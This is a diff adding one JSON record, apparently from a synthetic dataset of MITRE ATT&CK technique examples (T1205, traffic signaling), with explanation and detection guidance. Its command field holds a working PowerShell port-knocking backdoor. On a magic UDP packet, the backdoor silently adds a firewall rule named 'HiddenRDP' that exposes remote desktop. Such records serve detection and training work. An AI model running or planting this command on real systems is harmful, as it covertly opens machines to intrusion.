@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$port=49000;$magic='CA-FE-BA-BE-00-01';$u=New-Object System.Net.Sockets.UdpClient($port);$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);while($true){$buf=$u.Receive([ref]$ep);if([BitConverter]::ToString($buf) -eq $magic){& netsh advfirewall firewall add rule name='HiddenRDP' dir=in action=allow protocol=TCP localport=3389;break}}",
+  "explanation": "Listens for a specific UDP magic packet (CA-FE-BA-BE-00-01) on port 49000. Upon receipt, it opens an inbound Windows Firewall rule for RDP (TCP/3389), enabling access only after the covert signal. Requires elevated PowerShell (UAC) because it modifies firewall rules via netsh.",
+  "rationale_steps": [
+    "Open a UDP listener on a high port to await a secret magic packet.",
+    "When the exact magic bytes arrive, use netsh to add an inbound firewall rule opening TCP/3389.",
+    "Detection: monitor Security Event IDs 4946/4947 (firewall rule changes), Sysmon EID 1 for netsh.exe invocation, and unusual UDP packets to high ports with fixed payloads."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-c04e392e",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
